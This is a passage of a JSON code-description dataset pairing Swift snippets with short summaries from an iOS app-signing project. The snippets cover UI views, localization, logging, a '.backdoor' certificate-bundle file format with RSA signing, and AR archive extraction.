    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "function"
  },
  {
    "id": "133",
    "code": "private func setupButton(title: String) {\nactionButton.setTitle(title, for: .normal)\nactionButton.addTarget(self, action: #selector(buttonTapped), for: .touchUpInside)\n}\n\n/// Called when the action button is tapped\n@objc private func buttonTapped() {",
    "nl": "/ Sets up the action button with the specified title / - Parameter title: The button title",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "function"
  },
  {
    "id": "134",
    "code": "@objc private func buttonTapped() {\nbuttonAction?()\n}\n\n/// Returns the intrinsic content size for this view\noverride var intrinsicContentSize: CGSize {",
    "nl": "/ Called when the action button is tapped",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "function"
  },
  {
    "id": "135",
    "code": "class InlineButton: UIButton {\n/// Creates a new inline button with the default gear icon\n/// - Parameter frame: The frame rectangle for the view\noverride init(frame: CGRect) {",
    "nl": "/ A custom inline button with a gear icon for settings",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionHeaders.swift",
    "code_type": "class"
  },
  {
    "id": "136",
    "code": "private enum SectionIconConstants {\n/// Default sizes\nenum Sizes {",
    "nl": "/ Constants used by the SectionIcons class",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "enum"
  },
  {
    "id": "137",
    "code": "enum Sizes {\n/// Default icon size\nstatic let defaultIconSize = CGSize(width: 52, height: 52)\n/// Default symbol point size\nstatic let symbolPointSize: CGFloat = 16\n/// Default corner radius\nstatic let cornerRadius: CGFloat = 12\n/// Default inset amount for symbols\nstatic let symbolInset: CGFloat = 7\n}",
    "nl": "/ Default sizes",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "enum"
  },
  {
    "id": "138",
    "code": "enum Appearance {\n/// Default border width\nstatic let borderWidth: CGFloat = 1\n/// Border color\nstatic let borderColor = UIColor.lightGray.withAlphaComponent(0.3).cgColor\n}\n}\n\n/// Utility class for creating and managing section icons in table views\nclass SectionIcons {",
    "nl": "/ Visual properties",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "enum"
  },
  {
    "id": "139",
    "code": "class SectionIcons {\n/// Adds a SF Symbol icon with background color to a table view cell\n///\n/// - Parameters:\n///   - cell: The table cell to add the icon to\n///   - symbolName: The SF Symbol name to use\n///   - backgroundColor: The background color for the icon\n@available(iOS 13.0, *)\nstatic func sectionIcon(\nto cell: UITableViewCell,",
    "nl": "/ Utility class for creating and managing section icons in table views",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "class"
  },
  {
    "id": "140",
    "code": "static func sectionIcon(\nto cell: UITableViewCell,\nwith symbolName: String,\nbackgroundColor: UIColor\n) {",
    "nl": "Function sectionIcon - implements sectionicon functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "function"
  },
  {
    "id": "141",
    "code": "static func sectionImage(\nto cell: UITableViewCell,\nwith originalImage: UIImage,\nsize: CGSize = SectionIconConstants.Sizes.defaultIconSize,\nradius: Int = Int(SectionIconConstants.Sizes.cornerRadius)\n) {",
    "nl": "/ Adds an image icon to a table view cell, with optional resizing and styling / / - Parameters: /   - cell: The table cell to add the icon to /   - originalImage: The source image to use /   - size: The desired size for the image (default: 52x52) /   - radius: The corner radius to apply (default: 12)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "function"
  },
  {
    "id": "142",
    "code": "static func loadSectionImageFromURL(\nfrom url: URL,\nfor cell: UITableViewCell,\nat _: IndexPath,\nin _: UITableView\n) {",
    "nl": "/ Loads an image from a URL and applies it to a table view cell / / - Parameters: /   - url: The URL to load the image from /   - cell: The table cell to apply the image to /   - indexPath: The index path of the cell (unused but kept for API compatibility) /   - tableView: The table view containing the cell (unused but kept for API compatibility)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "function"
  },
  {
    "id": "143",
    "code": "static func loadImageFromURL(\nfrom url: URL,\ncompletion: @escaping (UIImage?) -> Void\n) {",
    "nl": "/ Loads an image from a URL and returns it via completion handler / / - Parameters: /   - url: The URL to load the image from /   - completion: A closure that will be called with the loaded image or nil if failed",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/SectionIcons.swift",
    "code_type": "function"
  },
  {
    "id": "144",
    "code": "class UIVariableBlurView: UIView {\n// MARK: - Private Properties\n\n/// Gets the filter class for blur effects\nprivate var filterClass: NSObjectProtocol? {",
    "nl": "/ UIView subclass that implements a variable blur effect using private APIs",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift",
    "code_type": "class"
  },
  {
    "id": "145",
    "code": "override class var layerClass: AnyClass {\nlet encodedString = \"Q0FCYWNrZHJvcExheWVy\"\nguard let data = Data(base64Encoded: encodedString),\nlet string = String(data: data, encoding: .utf8),\nlet layerClass = NSClassFromString(string)\nelse {",
    "nl": "/ Override to specify the layer class needed for blur effects",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift",
    "code_type": "class"
  },
  {
    "id": "146",
    "code": "private func setupVariableBlurFilter() {\n// Make sure all required components are available\nguard let filterClass = filterClass,\nlet filterType = filterType,\nlet selector = filterWithTypeSelector\nelse {",
    "nl": "MARK: - Private Methods / Sets up the variable blur filter with default values",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift",
    "code_type": "function"
  },
  {
    "id": "147",
    "code": "struct VariableBlurView: UIViewRepresentable {\n// MARK: - Properties\n\n/// Optional custom gradient mask to use\nvar customGradientMask: UIImage?\n\n/// Blur radius to apply\nvar blurRadius: CGFloat = 20\n\n// MARK: - UIViewRepresentable",
    "nl": "/ A SwiftUI-compatible variable blur view.",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift",
    "code_type": "struct"
  },
  {
    "id": "148",
    "code": "func makeUIView(context _: Context) -> UIVariableBlurView {\n// Create the view with zero frame\nlet view = UIVariableBlurView(frame: .zero)\n\n// Apply custom properties\nview.blurRadius = blurRadius\nview.gradientMask = customGradientMask ?? VariableBlurViewConstants.defaultGradientMask\n\nreturn view\n}",
    "nl": "MARK: - UIViewRepresentable / Creates the underlying UIKit view / - Parameter context: The context information / - Returns: A configured UIVariableBlurView",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift",
    "code_type": "function"
  },
  {
    "id": "149",
    "code": "func updateUIView(_ uiView: UIVariableBlurView, context _: Context) {\n// Update properties if they change\nuiView.blurRadius = blurRadius\nif let customMask = customGradientMask {",
    "nl": "/ Updates the view with new configuration / - Parameters: /   - uiView: The view to update /   - context: The context information",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift",
    "code_type": "function"
  },
  {
    "id": "150",
    "code": "public enum VariableBlurViewConstants {\n/// A gradient mask image (top is opaque, bottom is clear)\n/// The gradient includes easing for a smooth transition\npublic static var defaultGradientMask: UIImage {",
    "nl": "/ Constants used by the VariableBlurView",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/VariableBlurView.swift",
    "code_type": "enum"
  },
  {
    "id": "151",
    "code": "extension Bundle {\nstatic func makeLocalizationBundle(\npreferredLanguageCode: String? = Preferences.preferredLanguageCode\n) -> Bundle {",
    "nl": "extension Bundle - implements functionality related to bundle",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift",
    "code_type": "extension"
  },
  {
    "id": "152",
    "code": "static func makeLocalizationBundle(\npreferredLanguageCode: String? = Preferences.preferredLanguageCode\n) -> Bundle {",
    "nl": "Function makeLocalizationBundle - implements makelocalizationbundle functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift",
    "code_type": "function"
  },
  {
    "id": "153",
    "code": "extension String {\nstatic func localized(_ name: String) -> String {",
    "nl": "extension String - implements functionality related to string",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift",
    "code_type": "extension"
  },
  {
    "id": "154",
    "code": "static func localized(_ name: String) -> String {\nreturn NSLocalizedString(name, bundle: .preferredLocalizationBundle, comment: \"\")\n}\n\nstatic func localized(_ name: String, arguments: CVarArg...) -> String {",
    "nl": "Function localized - implements localized functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift",
    "code_type": "function"
  },
  {
    "id": "155",
    "code": "static func localized(_ name: String, arguments: CVarArg...) -> String {\nlet format = NSLocalizedString(name, bundle: .preferredLocalizationBundle, comment: \"\")\nreturn String(format: format, arguments: arguments)\n}\n\n/// Localizes the current string using the main bundle.\n///\n/// - Returns: The localized string.\nfunc localized() -> String {",
    "nl": "Function localized - implements localized functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift",
    "code_type": "function"
  },
  {
    "id": "156",
    "code": "func localized() -> String {\nreturn String.localized(self)\n}\n}\n",
    "nl": "/ Localizes the current string using the main bundle. / / - Returns: The localized string.",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Foundation.swift",
    "code_type": "function"
  },
  {
    "id": "157",
    "code": "struct Language {\nstatic var availableLanguages: [Self] {",
    "nl": "struct Language - implements functionality related to language",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Localizations/Language.swift",
    "code_type": "struct"
  },
  {
    "id": "158",
    "code": "public enum LogType {\n/// Default\ncase notice\n/// Call this function to capture information that may be helpful, but isn\u2019t essential, for troubleshooting.\ncase info\n/// Debug-level messages to use in a development environment while actively debugging.\ncase debug\n/// Equivalent of the debug method.\ncase trace\n/// Warning-level messages for reporting unexpected non-fatal failures.",
    "nl": "enum LogType - implements functionality related to log type",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "enum"
  },
  {
    "id": "159",
    "code": "final class Debug {\nstatic let shared = Debug()\nprivate let subsystem: String = {",
    "nl": "class Debug - implements functionality related to debug",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "class"
  },
  {
    "id": "160",
    "code": "private func appendLogToFile(_ message: String) {\ndo {",
    "nl": "Function appendLogToFile - implements appendlogtofile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "function"
  },
  {
    "id": "161",
    "code": "func log(\nmessage: String,\ntype: LogType? = nil,\nfunction: String = #function,\nfile: String = #file,\nline _: Int = #line\n) {",
    "nl": "Function log - implements log functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "function"
  },
  {
    "id": "162",
    "code": "func showSuccessAlert(with title: String, subtitle: String) {\nDispatchQueue.main.async {",
    "nl": "Function showSuccessAlert - implements showsuccessalert functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "function"
  },
  {
    "id": "163",
    "code": "func showErrorAlert(with title: String, subtitle: String) {\nDispatchQueue.main.async {",
    "nl": "Function showErrorAlert - implements showerroralert functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "function"
  },
  {
    "id": "164",
    "code": "func showErrorUIAlert(with title: String, subtitle: String) {\nDispatchQueue.main.async {",
    "nl": "Function showErrorUIAlert - implements showerroruialert functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "function"
  },
  {
    "id": "165",
    "code": "extension UIAlertController {\nstatic func error(title: String, message: String, actions: [UIAlertAction]) -> UIAlertController {",
    "nl": "extension UIAlertController - Controls user interface and application flow",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "extension"
  },
  {
    "id": "166",
    "code": "static func error(title: String, message: String, actions: [UIAlertAction]) -> UIAlertController {\nlet alertController = UIAlertController(title: title, message: message, preferredStyle: .alert)\n\nalertController.addAction(UIAlertAction(title: String.localized(\"OK\"), style: .cancel) { _ in",
    "nl": "Function error - implements error functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "function"
  },
  {
    "id": "167",
    "code": "static func coolAlert(title: String, message: String, actions: [UIAlertAction]) -> UIAlertController {\nlet alertController = UIAlertController(title: title, message: message, preferredStyle: .alert)\n\nfor action in actions {",
    "nl": "Function coolAlert - implements coolalert functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Logging/Logger.swift",
    "code_type": "function"
  },
  {
    "id": "168",
    "code": "struct BackdoorFile {\nlet certificate: SecCertificate // DER-encoded certificate\nlet p12Data: Data // Raw .p12 file data\nlet mobileProvisionData: Data // Raw .mobileprovision file data\nlet signature: Data // Signature over mobileprovision data\n}\n\n/// Provides encoding and decoding capabilities for .backdoor files\nclass BackdoorDecoder {",
    "nl": "/ A representation of a .backdoor file which contains all components needed for signing",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "struct"
  },
  {
    "id": "169",
    "code": "class BackdoorDecoder {\n/// Format version constant - used to identify the encrypted format\nprivate static let ENCRYPTED_FORMAT_VERSION: UInt8 = 1\n\n/// Decodes a .backdoor file from raw data\n/// - Parameter data: The raw content of a .backdoor file\n/// - Returns: A structured BackdoorFile object with verified components\nstatic func decodeBackdoor(from data: Data) throws -> BackdoorFile {",
    "nl": "/ Provides encoding and decoding capabilities for .backdoor files",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "class"
  },
  {
    "id": "170",
    "code": "static func decodeBackdoor(from data: Data) throws -> BackdoorFile {\n// Check format version - first byte 0x01 indicates encrypted format\nif data.count > 1 && data[0] == ENCRYPTED_FORMAT_VERSION {",
    "nl": "/ Decodes a .backdoor file from raw data / - Parameter data: The raw content of a .backdoor file / - Returns: A structured BackdoorFile object with verified components",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "171",
    "code": "private static func decodeEncryptedBackdoor(from data: Data) throws -> BackdoorFile {\n// Skip the version byte\nvar offset = 1\n\n// Helper to read a length-prefixed chunk with encrypted data\nfunc readEncryptedChunk(from data: Data, offset: inout Int) throws -> Data {",
    "nl": "/ Decodes an encrypted .backdoor file / - Parameter data: The encrypted .backdoor file data / - Returns: A structured BackdoorFile object",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "172",
    "code": "func readEncryptedChunk(from data: Data, offset: inout Int) throws -> Data {\n// Read original length (before encryption)\nguard offset + 4 <= data.count else {",
    "nl": "Helper to read a length-prefixed chunk with encrypted data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "173",
    "code": "private static func decodeLegacyBackdoor(from data: Data) throws -> BackdoorFile {\nvar offset = 0\n\n// Parse certificate\nlet certData = try readChunk(from: data, offset: &offset)\nguard let certificate = SecCertificateCreateWithData(nil, certData as CFData) else {",
    "nl": "/ Decodes a legacy (unencrypted) .backdoor file / - Parameter data: The unencrypted .backdoor file data / - Returns: A structured BackdoorFile object",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "174",
    "code": "static func verifySignature(certificate: SecCertificate, data: Data, signature: Data) throws {\n// Get public key from certificate\nguard let publicKey = SecCertificateCopyKey(certificate) else {",
    "nl": "/ Verifies that the signature is valid for the provided data using the certificate's public key / - Parameters: /   - certificate: The certificate containing the public key to verify against /   - data: The data that was signed /   - signature: The signature to verify",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "175",
    "code": "static func createBackdoorFile(\ncertificateData: Data,\np12Data: Data,\nmobileProvisionData: Data,\nprivateKey: SecKey\n) throws -> BackdoorFile {",
    "nl": "/ Creates a new .backdoor file from individual components (legacy unencrypted format) / - Parameters: /   - certificateData: Raw DER-encoded certificate data /   - p12Data: Raw p12 data /   - mobileProvisionData: Raw mobileprovision data /   - privateKey: The private key used to sign the mobileprovision data / - Returns: A complete BackdoorFile instance",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "176",
    "code": "static func createEncryptedBackdoorFile(\ncertificateData: Data,\np12Data: Data,\nmobileProvisionData: Data,\nprivateKey: SecKey\n) throws -> BackdoorFile {",
    "nl": "/ Creates a new encrypted .backdoor file from individual components / - Parameters: /   - certificateData: Raw DER-encoded certificate data /   - p12Data: Raw p12 data /   - mobileProvisionData: Raw mobileprovision data /   - privateKey: The private key used to sign the mobileprovision data / - Returns: A complete BackdoorFile instance",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "177",
    "code": "static func signData(_ data: Data, with privateKey: SecKey) throws -> Data {\nlet algorithm = SecKeyAlgorithm.rsaSignatureMessagePKCS1v15SHA256\n\nguard SecKeyIsAlgorithmSupported(privateKey, .sign, algorithm) else {",
    "nl": "/ Signs data using a private key / - Parameters: /   - data: The data to sign /   - privateKey: The private key to use for signing / - Returns: The signature data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "178",
    "code": "static func encodeBackdoor(backdoorFile: BackdoorFile) -> Data {\nvar data = Data()\n\n// Helper to write a length-prefixed chunk\nfunc writeChunk(_ chunkData: Data, to data: inout Data) {",
    "nl": "/ Encodes a BackdoorFile into raw data (legacy unencrypted format) / - Parameter backdoorFile: The structured BackdoorFile to encode / - Returns: Raw data representing the .backdoor file format",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "179",
    "code": "func writeChunk(_ chunkData: Data, to data: inout Data) {\nlet length = UInt32(chunkData.count).bigEndian\nlet lengthBytes = withUnsafeBytes(of: length) { Data($0) }",
    "nl": "Helper to write a length-prefixed chunk",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "180",
    "code": "static func encodeEncryptedBackdoor(backdoorFile: BackdoorFile) -> Data {\nvar data = Data()\n\n// Add format version byte\ndata.append(ENCRYPTED_FORMAT_VERSION)\n\n// Helper to write a length-prefixed chunk\nfunc writeChunk(_ chunkData: Data, to data: inout Data) {",
    "nl": "/ Encodes a BackdoorFile into raw data with encryption (new format) / - Parameter backdoorFile: The structured BackdoorFile to encode / - Returns: Raw data representing the encrypted .backdoor file format",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "181",
    "code": "func writeChunk(_ chunkData: Data, to data: inout Data) {\nlet length = UInt32(chunkData.count).bigEndian\nlet lengthBytes = withUnsafeBytes(of: length) { Data($0) }",
    "nl": "Helper to write a length-prefixed chunk",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "182",
    "code": "func writeEncryptedChunk(_ chunkData: Data, to data: inout Data) {\n// Store original length\nlet originalLength = UInt32(chunkData.count).bigEndian\nlet originalLengthBytes = withUnsafeBytes(of: originalLength) { Data($0) }",
    "nl": "Helper to write an encrypted chunk",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "183",
    "code": "static func isBackdoorFile(at url: URL) -> Bool {\n// First check extension\nif url.pathExtension.lowercased() == \"backdoor\" {",
    "nl": "/ Checks if a file URL points to a .backdoor file / - Parameter url: The file URL to check / - Returns: True if the file is likely a backdoor file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "184",
    "code": "static func isBackdoorFormat(data: Data) -> Bool {\n// Check for encrypted format\nif data.count > 1 && data[0] == ENCRYPTED_FORMAT_VERSION {",
    "nl": "/ Helper method to check if data is in the backdoor file format / - Parameter data: The data to check / - Returns: True if the data appears to be in backdoor format",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "185",
    "code": "static func readChunk(from data: Data, offset: inout Int) throws -> Data {\nguard offset + 4 <= data.count else {",
    "nl": "/ Helper to read a length-prefixed chunk (used by multiple methods)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "186",
    "code": "enum DecodingError: Error {\ncase invalidFormat(String)\ncase invalidCertificate(String)\ncase unsupportedAlgorithm(String)\ncase signatureVerificationFailed(String)\ncase decryptionFailed(String)\n}\n\n// Add utility extensions for BackdoorFile\nextension BackdoorFile {",
    "nl": "/ Errors that can occur during decoding or verification of backdoor files",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "enum"
  },
  {
    "id": "187",
    "code": "extension BackdoorFile {\n/// Extract and return certificate name for display\nvar certificateName: String {",
    "nl": "Add utility extensions for BackdoorFile",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "extension"
  },
  {
    "id": "188",
    "code": "func saveMobileProvision(to url: URL) throws {\ntry mobileProvisionData.write(to: url)\n}\n\n/// Helper to save the p12 file\nfunc saveP12(to url: URL) throws {",
    "nl": "/ Helper to save the mobileprovision file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "189",
    "code": "func saveP12(to url: URL) throws {\ntry p12Data.write(to: url)\n}\n\n/// Save this backdoor file to disk with .backdoor extension\n/// - Parameters:\n///   - url: Base URL (without extension)\n///   - encrypt: Whether to use the encrypted format (default: true)\n/// - Returns: URL to the saved file\n@discardableResult",
    "nl": "/ Helper to save the p12 file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "190",
    "code": "func saveBackdoorFile(to baseURL: URL, encrypt: Bool = true) throws -> URL {\n// Ensure the URL has the .backdoor extension\nlet fileURL: URL\nif baseURL.pathExtension.lowercased() != \"backdoor\" {",
    "nl": "Function saveBackdoorFile - implements savebackdoorfile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift",
    "code_type": "function"
  },
  {
    "id": "191",
    "code": "public struct ARFile {\nvar name: String\nvar modificationDate: Date\nvar ownerId: Int\nvar groupId: Int\nvar mode: Int\nvar size: Int\nvar content: Data\n}\n",
    "nl": "struct ARFile - implements functionality related to a r file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift",
    "code_type": "struct"
  },
  {
    "id": "192",
    "code": "func removePadding(_ paddedString: String) -> String {\nlet data = paddedString.data(using: .utf8)!\n\nguard let firstNonSpaceIndex = data.firstIndex(of: UInt8(ascii: \" \")) else {",
    "nl": "Function removePadding - implements removepadding functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift",
    "code_type": "function"
  },
  {
    "id": "193",
    "code": "enum ARError: Error {\ncase badArchive(String)\n}\n\nfunc getFileInfo(_ data: Data, _ offset: Int) throws -> ARFile {",
    "nl": "enum ARError - implements functionality related to a r error",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift",
    "code_type": "enum"
  },
  {
    "id": "194",
    "code": "func getFileInfo(_ data: Data, _ offset: Int) throws -> ARFile {\nlet sizeRange = offset + 48 ..< offset + 48 + 10\nlet sizeString = String(data: data.subdata(in: sizeRange), encoding: .ascii) ?? \"0\"\nlet size = Int(removePadding(sizeString))!\nif size < 1 {",
    "nl": "Function getFileInfo - retrieves fileinfo",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift",
    "code_type": "function"
  },
  {
    "id": "195",
    "code": "public func extractAR(_ rawData: Data) throws -> [ARFile] {\n// Explicitly type magicBytes as [UInt8] to match the headerBytes type\nlet magicBytes: [UInt8] = [0x21, 0x3C, 0x61, 0x72, 0x63, 0x68, 0x3E, 0x0A]\nlet headerData = rawData.subdata(in: 0 ..< 8)\n// Create a more explicit [UInt8] array conversion for unambiguous type checking\nlet headerBytes = [UInt8](headerData)\nif headerBytes != magicBytes {",
    "nl": "Function extractAR - implements extractar functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift",
    "code_type": "function"
  },
  {
    "id": "196",
    "code": "func processFile(at packagesFile: inout URL) throws {\nlet succeededExtension = packagesFile.pathExtension.lowercased()\nlet fileManager = FileManager.default\n\nfunc readData(from url: URL) throws -> Data {",
    "nl": "Function processFile - implements processfile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift",
    "code_type": "function"
  },
  {
    "id": "197",
    "code": "func readData(from url: URL) throws -> Data {\nreturn try Data(contentsOf: url)\n}\n\nfunc writeData(_ data: Data, to url: URL) throws {",
    "nl": "Function readData - implements readdata functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift",
    "code_type": "function"
  },
  {
    "id": "198",
    "code": "func writeData(_ data: Data, to url: URL) throws {\ntry data.write(to: url)\n}\n\nfunc handleCompressedFile(extension _: String, decompressor: (Data) throws -> Data) throws {",
    "nl": "Function writeData - implements writedata functionality",
    "language": "swift",
    "folder": "Shared",
